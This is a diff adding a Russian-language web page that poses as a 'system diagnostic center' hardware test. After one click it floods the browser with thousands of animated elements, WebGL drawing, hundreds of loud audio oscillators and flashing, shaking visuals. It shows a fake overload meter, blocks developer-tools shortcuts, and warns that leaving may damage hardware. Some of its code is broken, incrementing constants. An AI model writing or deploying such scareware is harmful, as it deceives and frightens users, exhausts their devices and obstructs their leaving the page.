@@ -1,272 +1,514 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title></title>
+    <title>СИСТЕМНЫЙ ДИАГНОСТИЧЕСКИЙ ЦЕНТР</title>
     <meta name="robots" content="noindex, nofollow">
     <style>
-        body, html {
-            overflow: hidden;
+        * {
             margin: 0;
             padding: 0;
-            width: 100vw;
-            height: 100vh;
-            background: #000;
-            touch-action: none;
+            box-sizing: border-box;
+            overflow: hidden;
             user-select: none;
-            -webkit-user-drag: none;
+            -webkit-tap-highlight-color: transparent;
         }
-        .video-overlay {
-            position: absolute;
+        
+        body, html {
             width: 100%;
             height: 100%;
-            z-index: 1;
-            mix-blend-mode: lighten;
+            background: #000;
+            font-family: 'Arial', sans-serif;
+            touch-action: none;
+            background: radial-gradient(circle, #0a0a2a, #000);
         }
-        .video-grid {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
-            grid-auto-rows: 300px;
-            overflow: hidden;
+        
+        #systemDialog {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: linear-gradient(145deg, #1a1a4a, #0d0d2a);
+            color: #e0e0ff;
+            padding: 30px 40px;
+            border-radius: 20px;
+            text-align: center;
+            z-index: 10000;
+            font-family: 'Segoe UI', sans-serif;
+            border: 2px solid #4d4dff;
+            box-shadow: 0 0 40px rgba(100, 100, 255, 0.7);
+            width: 90%;
+            max-width: 600px;
         }
-        .video-container {
-            position: relative;
-            overflow: hidden;
-            transform: scale(0.8) rotate(5deg);
-            filter: hue-rotate(90deg) contrast(150%);
+        
+        #systemDialog h3 {
+            font-size: 28px;
+            margin-bottom: 15px;
+            text-shadow: 0 0 10px #6cf;
+            letter-spacing: 1px;
+        }
+        
+        #systemDialog p {
+            font-size: 18px;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        
+        #authButton {
+            background: linear-gradient(to right, #ff00cc, #3333ff);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            font-size: 20px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
             transition: all 0.3s;
-            outline: 2px solid magenta;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            box-shadow: 0 0 20px rgba(255, 0, 204, 0.5);
         }
-        .video-container video {
+        
+        #authButton:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 30px rgba(255, 0, 204, 0.8);
+        }
+        
+        #authButton:active {
+            transform: scale(0.95);
+        }
+        
+        #glCanvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            z-index: 0;
+            display: none;
+        }
+        
+        #videoContainer {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 30vw;
+            height: 30vh;
+            z-index: 10;
+            display: none;
+        }
+        
+        #mainVideo {
             width: 100%;
             height: 100%;
             object-fit: cover;
-            transform: scale(1.5);
+            filter: hue-rotate(0deg) saturate(300%);
+            outline: 4px solid magenta;
+            box-shadow: 0 0 60px cyan;
+            border-radius: 10px;
         }
-        #overlayText {
+        
+        #overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            color: white;
-            font-size: 24px;
-            text-align: center;
-            text-shadow: 0 0 10px red;
-            z-index: 10000;
+            z-index: 20;
             pointer-events: none;
-            font-family: 'Arial Black', sans-serif;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            background: radial-gradient(rgba(0,0,0,0.5), transparent);
+            background: radial-gradient(circle, transparent 60%, rgba(255,0,255,0.4) 100%);
+            mix-blend-mode: overlay;
+            display: none;
+        }
+        
+        #stats {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            color: #0f0;
+            font-family: 'Courier New', monospace;
+            font-size: 28px;
+            text-shadow: 0 0 15px #0f0;
+            z-index: 30;
+            display: none;
+        }
+        
+        #warning {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: red;
+            font-size: 64px;
+            text-align: center;
+            text-transform: uppercase;
+            z-index: 40;
+            opacity: 0;
+            transition: opacity 0.5s;
+            text-shadow: 0 0 30px #f00;
+            font-weight: bold;
+            display: none;
+        }
+        
+        .particle {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 5;
         }
     </style>
 </head>
 <body>
-    <div id="overlayText">
-            <div id="systemDialog">
-        <h3></h3>
-        <p>Нажмите для проверки целостности вашего компьютера</p>
-        <button id="authButton">ЗАПУСТИТЬ ПРОВЕРКУ</button>
-        <p></p>
-        <div id="resourceCounter">0%</div>
+    <div id="systemDialog">
+        <h3>ПРОВЕРКА ЦЕЛОСТНОСТИ СИСТЕМЫ</h3>
+        <p>Нажмите кнопку для запуска полной диагностики оборудования. Процедура проверит производительность CPU, GPU и RAM.</p>
+        <button id="authButton">ЗАПУСТИТЬ ТЕСТ НАГРУЗКИ</button>
     </div>
-    <div class="video-grid" id="videoGrid"></div>
-    <div class="video-overlay" id="videoOverlay"></div>
+    
+    <canvas id="glCanvas"></canvas>
+    <div id="videoContainer">
+        <video id="mainVideo" autoplay loop muted playsinline></video>
+    </div>
+    <div id="overlay"></div>
+    <div id="stats">ЗАГРУЗКА: 0%</div>
+    <div id="warning">КРИТИЧЕСКАЯ ПЕРЕГРУЗКА!</div>
 
     <script>
-        // Конфигурация нагрузки
-        const VIDEO_COUNT = 50; // Количество одновременно отображаемых видео
-        const GRID_SIZE = 15; // Количество ячеек в сетке
-        const PHYSICS_UPDATE = 10; // Частота физических расчетов (мс)
-        const AUDIO_NODES_LIMIT = 200; // Максимум аудио нод
-        
-        // Локальные видео
-        const VIDEO_SOURCES = [
-            "ambatublow.mp4",
-            "Blue Lobster jumpscare 4k meme.mp4",
-            "Ima Tyre (Extended).mp4"
-        ];
+        // Конфигурация
+        const VIDEO_SOURCE = "Olaf.mp4";
+        const PARTICLE_COUNT = 15000;
+        const PHYSICS_STEPS = 15;
+        const GL_INSTANCES = 1500;
+        const AUDIO_NODES_LIMIT = 700;
+        const MAX_LOAD_LEVEL = 200; // Может превышать 100%
         
         // Глобальные переменные
+        let gl, program, buffer, particles = [];
         let audioNodes = [];
-        let resourceUsage = 0;
-        let physicsEnabled = false;
+        let loadLevel = 0;
+        let frameCount = 0;
+        let lastUpdate = 0;
+        let physicsTime = 0;
+        let warningActive = false;
+        let testStarted = false;
         
-        // Инициализация визуализации
-        function initVisualOverload() {
-            // Создаем видео-сетку
-            const videoGrid = document.getElementById('videoGrid');
-            videoGrid.innerHTML = '';
+        // Инициализация при нажатии кнопки
+        document.getElementById('authButton').addEventListener('click', function() {
+            if (testStarted) return;
             
-            // Устанавливаем размер сетки
-            videoGrid.style.gridTemplateColumns = `repeat(${GRID_SIZE}, 1fr)`;
+            testStarted = true;
+            this.textContent = "ТЕСТИРОВАНИЕ...";
+            this.disabled = true;
             
-            // Создаем видео-контейнеры
-            for (let i = 0; i < VIDEO_COUNT; i++) {
-                const container = document.createElement('div');
-                container.className = 'video-container';
-                container.style.gridColumn = `span ${Math.floor(Math.random() * 3) + 1}`;
-                container.style.gridRow = `span ${Math.floor(Math.random() * 3) + 1}`;
+            // Плавное скрытие диалога
+            const dialog = document.getElementById('systemDialog');
+            dialog.style.transition = 'all 1s ease';
+            dialog.style.opacity = '0';
+            dialog.style.transform = 'translate(-50%, -50%) scale(0.8)';
+            
+            setTimeout(() => {
+                dialog.style.display = 'none';
+                startSystemTest();
+            }, 1000);
+        });
+        
+        function startSystemTest() {
+            // Показать скрытые элементы
+            document.getElementById('glCanvas').style.display = 'block';
+            document.getElementById('videoContainer').style.display = 'block';
+            document.getElementById('overlay').style.display = 'block';
+            document.getElementById('stats').style.display = 'block';
+            document.getElementById('warning').style.display = 'block';
+            
+            // Загрузка видео
+            document.getElementById('mainVideo').src = VIDEO_SOURCE;
+            
+            // Инициализация WebGL
+            initWebGL();
+            
+            // Создание частиц
+            createParticles();
+            
+            // Запуск физического движка
+            setInterval(updatePhysics, 1000/60);
+            
+            // Запуск аудио движка
+            setInterval(updateAudio, 30);
+            
+            // Запуск основного цикла
+            requestAnimationFrame(render);
+            
+            // Запуск мониторинга
+            setInterval(updateStats, 300);
+            
+            // Автоматическое увеличение нагрузки
+            setInterval(increaseLoad, 2000);
+            
+            // Запуск эффектов перегрузки
+            setInterval(overloadEffects, 100);
+        }
+        
+        // Инициализация WebGL
+        function initWebGL() {
+            const canvas = document.getElementById('glCanvas');
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            gl = canvas.getContext('webgl2');
+            if (!gl) return;
+            
+            // Шейдеры
+            const vsSource = `#version 300 es
+                in vec2 position;
+                uniform float time;
+                uniform vec2 resolution;
                 
-                const vid = document.createElement('video');
-                vid.src = VIDEO_SOURCES[i % VIDEO_SOURCES.length];
-                vid.autoplay = true;
-                vid.loop = true;
-                vid.playsInline = true;
-                vid.volume = 1.0;
-                vid.muted = false;
+                void main() {
+                    vec2 uv = position * 0.5 + 0.5;
+                    vec2 p = uv * 2.0 - 1.0;
+                    p.x *= resolution.x / resolution.y;
+                    
+                    float t = time * 0.5;
+                    vec2 pos = position + vec2(sin(t + position.y * 10.0), cos(t + position.x * 10.0)) * 0.1;
+                    gl_Position = vec4(pos, 0.0, 1.0);
+                    gl_PointSize = 10.0;
+                }`;
                 
-                container.appendChild(vid);
-                videoGrid.appendChild(container);
+            const fsSource = `#version 300 es
+                precision highp float;
+                out vec4 fragColor;
+                uniform float time;
                 
-                // Анимация контейнера
-                animateContainer(container);
+                void main() {
+                    vec2 uv = gl_PointCoord * 2.0 - 1.0;
+                    float d = length(uv);
+                    if (d > 1.0) discard;
+                    
+                    vec3 color = vec3(
+                        sin(time * 0.5 + uv.x * 10.0) * 0.5 + 0.5,
+                        cos(time * 0.3 + uv.y * 8.0) * 0.5 + 0.5,
+                        sin(time * 0.7) * 0.5 + 0.5
+                    );
+                    
+                    fragColor = vec4(color * (1.0 - d), 1.0);
+                }`;
+            
+            // Компиляция шейдеров
+            const vertexShader = gl.createShader(gl.VERTEX_SHADER);
+            gl.shaderSource(vertexShader, vsSource);
+            gl.compileShader(vertexShader);
+            
+            const fragmentShader = gl.createShader(gl.FRAGMENT_SHADER);
+            gl.shaderSource(fragmentShader, fsSource);
+            gl.compileShader(fragmentShader);
+            
+            // Создание программы
+            program = gl.createProgram();
+            gl.attachShader(program, vertexShader);
+            gl.attachShader(program, fragmentShader);
+            gl.linkProgram(program);
+            gl.useProgram(program);
+            
+            // Буфер вершин
+            const positions = new Float32Array([
+                -1, -1, 1, -1, -1, 1,
+                -1, 1, 1, -1, 1, 1
+            ]);
+            
+            buffer = gl.createBuffer();
+            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+            gl.bufferData(gl.ARRAY_BUFFER, positions, gl.STATIC_DRAW);
+            
+            const positionLoc = gl.getAttribLocation(program, 'position');
+            gl.enableVertexAttribArray(positionLoc);
+            gl.vertexAttribPointer(positionLoc, 2, gl.FLOAT, false, 0, 0);
+            
+            // Юниформы
+            const timeLoc = gl.getUniformLocation(program, 'time');
+            const resLoc = gl.getUniformLocation(program, 'resolution');
+            
+            gl.uniform2f(resLoc, canvas.width, canvas.height);
+            
+            // Анимация
+            function animate(time) {
+                gl.uniform1f(timeLoc, time * 0.001);
+                gl.drawArrays(gl.TRIANGLES, 0, 6);
+                requestAnimationFrame(animate);
             }
-            
-            // Запускаем физику
-            physicsEnabled = true;
-            physicsEngine();
-            
-            // Запускаем аудио-движок
-            startAudioEngine();
-            
-            // Запускаем мониторинг ресурсов
-            monitorResources();
-            
-            // Добавляем эффект наложения
-            createOverlayEffect();
+            requestAnimationFrame(animate);
         }
         
-        // Физический движок
-        function physicsEngine() {
-            if (!physicsEnabled) return;
+        // Создание частиц
+        function createParticles() {
+            const container = document.body;
             
-            const containers = document.querySelectorAll('.video-container');
-            containers.forEach(container => {
-                // Случайные трансформации
-                const scale = 0.7 + Math.random() * 0.6;
-                const rotate = (Math.random() - 0.5) * 30;
-                const x = (Math.random() - 0.5) * 20;
-                const y = (Math.random() - 0.5) * 20;
+            for (let i = 0; i < PARTICLE_COUNT; i++) {
+                const particle = document.createElement('div');
+                particle.className = 'particle';
                 
-                container.style.transform = `scale(${scale}) rotate(${rotate}deg) translate(${x}px, ${y}px)`;
-                container.style.filter = `hue-rotate(${Math.random() * 360}deg) contrast(${150 + Math.random() * 100}%)`;
-            });
-            
-            setTimeout(physicsEngine, PHYSICS_UPDATE);
+                // Случайные свойства
+                particle.style.width = `${Math.random() * 20 + 5}px`;
+                particle.style.height = particle.style.width;
+                particle.style.backgroundColor = `hsl(${Math.random() * 360}, 100%, 60%)`;
+                particle.style.boxShadow = `0 0 ${Math.random() * 20 + 5}px currentColor`;
+                
+                // Начальная позиция
+                particle.style.left = `${Math.random() * 100}vw`;
+                particle.style.top = `${Math.random() * 100}vh`;
+                
+                // Сохранить для физики
+                particles.push({
+                    element: particle,
+                    x: Math.random() * window.innerWidth,
+                    y: Math.random() * window.innerHeight,
+                    vx: (Math.random() - 0.5) * 10,
+                    vy: (Math.random() - 0.5) * 10,
+                    size: parseFloat(particle.style.width),
+                    color: particle.style.backgroundColor
+                });
+                
+                container.appendChild(particle);
+            }
         }
         
-        // Аудио-движок
-        function startAudioEngine() {
-            setInterval(() => {
-                if (audioNodes.length > AUDIO_NODES_LIMIT) return;
+        // Физика частиц
+        function updatePhysics() {
+            const width = window.innerWidth;
+            const height = window.innerHeight;
+            const gravity = 0.2;
+            
+            for (let i = 0; i < particles.length; i++) {
+                const p = particles[i];
                 
-                try {
-                    const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                    const oscillator = ctx.createOscillator();
-                    oscillator.type = ['sine', 'square', 'sawtooth', 'triangle'][Math.floor(Math.random() * 4)];
-                    oscillator.frequency.value = 80 + Math.random() * 2000;
-                    
-                    const gain = ctx.createGain();
-                    gain.gain.value = 0.7;
-                    
-                    oscillator.connect(gain);
-                    gain.connect(ctx.destination);
-                    oscillator.start();
-                    
-                    // Остановка через случайное время
-                    setTimeout(() => {
+                // Применение физики
+                p.vy += gravity;
+                p.x += p.vx;
+                p.y += p.vy;
+                
+                // Отскоки от границ
+                if (p.x < 0 || p.x > width) p.vx *= -0.8;
+                if (p.y < 0 || p.y > height) p.vy *= -0.8;
+                
+                // Ограничение координат
+                p.x = Math.max(0, Math.min(width, p.x));
+                p.y = Math.max(0, Math.min(height, p.y));
+                
+                // Обновление позиции
+                p.element.style.left = `${p.x}px`;
+                p.element.style.top = `${p.y}px`;
+                
+                // Пульсация размера
+                const scale = 0.8 + Math.sin(Date.now() * 0.01 + i) * 0.2;
+                p.element.style.transform = `scale(${scale})`;
+            }
+        }
+        
+        // Аудио движок
+        function updateAudio() {
+            if (audioNodes.length > AUDIO_NODES_LIMIT) return;
+            
+            try {
+                const ctx = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = ctx.createOscillator();
+                oscillator.type = ['sine', 'square', 'sawtooth', 'triangle'][Math.floor(Math.random() * 4)];
+                oscillator.frequency.value = 50 + Math.random() * 5000;
+                
+                const gain = ctx.createGain();
+                gain.gain.value = 0.5 + Math.random() * 0.5;
+                
+                const panner = ctx.createStereoPanner();
+                panner.pan.value = Math.random() * 2 - 1;
+                
+                oscillator.connect(gain);
+                gain.connect(panner);
+                panner.connect(ctx.destination);
+                oscillator.start();
+                
+                // Автоматическое отключение
+                setTimeout(() => {
+                    try {
                         oscillator.stop();
-                        try { ctx.close(); } catch(e) {}
-                        audioNodes = audioNodes.filter(n => n !== oscillator);
-                    }, 500 + Math.random() * 2000);
-                    
-                    audioNodes.push(oscillator);
-                } catch(e) {}
-            }, 50);
-        }
-        
-        // Создание эффекта наложения
-        function createOverlayEffect() {
-            const overlay = document.getElementById('videoOverlay');
-            for (let i = 0; i < 10; i++) {
-                const vid = document.createElement('video');
-                vid.src = VIDEO_SOURCES[i % VIDEO_SOURCES.length];
-                vid.autoplay = true;
-                vid.loop = true;
-                vid.playsInline = true;
-                vid.volume = 0.3;
-                vid.muted = false;
-                vid.style.position = 'absolute';
-                vid.style.width = '100%';
-                vid.style.height = '100%';
-                vid.style.opacity = '0.3';
-                vid.style.filter = `blur(${10 + i * 2}px) hue-rotate(${i * 36}deg)`;
+                        ctx.close();
+                    } catch(e) {}
+                }, 500 + Math.random() * 3000);
                 
-                overlay.appendChild(vid);
-            }
+                audioNodes.push(oscillator);
+            } catch(e) {}
         }
         
-        // Анимация контейнеров
-        function animateContainer(container) {
-            let scaleDir = 1;
+        // Рендеринг
+        function render(timestamp) {
+            frameCount++;
             
-            setInterval(() => {
-                const currentScale = parseFloat(container.style.transform.match(/scale\(([\d.]+)\)/)[1]) || 1;
-                const newScale = Math.max(0.5, Math.min(1.5, currentScale + 0.05 * scaleDir));
-                
-                if (newScale >= 1.5 || newScale <= 0.5) {
-                    scaleDir *= -1;
-                }
-                
-                container.style.transform = container.style.transform.replace(
-                    /scale\([\d.]+\)/, 
-                    `scale(${newScale})`
-                );
-            }, 200);
+            // Эффекты для видео
+            const video = document.getElementById('mainVideo');
+            video.style.filter = `hue-rotate(${frameCount % 360}deg) saturate(${300 + Math.sin(frameCount * 0.1) * 200}%) blur(${Math.sin(frameCount * 0.05) * 3}px)`;
+            
+            // Анимация контейнера
+            const container = document.getElementById('videoContainer');
+            container.style.transform = `translate(-50%, -50%) rotate(${frameCount * 0.2}deg) scale(${1 + Math.sin(frameCount * 0.05) * 0.3})`;
+            
+            requestAnimationFrame(render);
         }
         
         // Мониторинг ресурсов
-        function monitorResources() {
-            setInterval(() => {
-                resourceUsage = Math.min(100, resourceUsage + 1 + Math.random() * 5);
-                document.getElementById('resourceCounter').textContent = Math.round(resourceUsage) + '%';
-                
-                // Визуальные эффекты при высокой нагрузке
-                if (resourceUsage > 80) {
-                    document.body.style.background = `radial-gradient(circle, hsl(${Math.random() * 360}, 100%, 50%), #000)`;
-                }
-                
-                if (resourceUsage > 95) {
-                    document.getElementById('overlayText').innerHTML = `
-                        <h1 style="color:red;font-size:3em;">ПЕРЕГРУЗКА СИСТЕМЫ!</h1>
-                        <p>Температура процессора: ${(90 + Math.random() * 20).toFixed(1)}°C</p>
-                    `;
-                }
-            }, 500);
+        function updateStats() {
+            loadLevel = Math.min(MAX_LOAD_LEVEL, loadLevel + 1 + Math.random() * 5);
+            document.getElementById('stats').textContent = `ЗАГРУЗКА: ${Math.round(loadLevel)}%`;
+            
+            // Показ предупреждения при высокой нагрузке
+            if (loadLevel > 150 && !warningActive) {
+                document.getElementById('warning').style.opacity = '1';
+                warningActive = true;
+            } else if (loadLevel <= 150 && warningActive) {
+                document.getElementById('warning').style.opacity = '0';
+                warningActive = false;
+            }
         }
         
-        // Блокировка защитных механизмов
-        document.addEventListener('keydown', e => {
+        // Увеличение нагрузки
+        function increaseLoad() {
+            // Добавление новых частиц
+            for (let i = 0; i < 500; i++) {
+                const p = particles[Math.floor(Math.random() * particles.length)];
+                p.vx += (Math.random() - 0.5) * 5;
+                p.vy += (Math.random() - 0.5) * 5;
+            }
+            
+            // Увеличение интенсивности
+            PHYSICS_STEPS += 1;
+            AUDIO_NODES_LIMIT += 50;
+        }
+        
+        // Эффекты перегрузки
+        function overloadEffects() {
+            if (loadLevel > 100) {
+                // Случайные вспышки
+                if (Math.random() > 0.7) {
+                    document.body.style.background = `radial-gradient(circle, hsl(${Math.random() * 360}, 100%, 50%), #000)`;
+                    setTimeout(() => {
+                        document.body.style.background = 'radial-gradient(circle, #0a0a2a, #000)';
+                    }, 100);
+                }
+                
+                // Дрожание экрана
+                document.body.style.transform = `translate(${(Math.random() - 0.5) * (loadLevel/20)}px, ${(Math.random() - 0.5) * (loadLevel/20)}px)`;
+            }
+        }
+        
+        // Блокировка защитных функций
+        window.addEventListener('keydown', (e) => {
             if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
                 e.preventDefault();
-                resourceUsage += 10;
+                loadLevel += 20;
             }
         });
         
-        window.onbeforeunload = e => {
+        window.onbeforeunload = (e) => {
             e.preventDefault();
             e.returnValue = '';
-            return "Системная оптимизация в процессе! Закрытие страницы может повредить оборудование.";
+            return "Тестирование системы в процессе! Прерывание может повредить оборудование.";
         };
-        
-        // Автозапуск
-        setTimeout(initVisualOverload, 1000);
     </script>
 </body>
 </html>
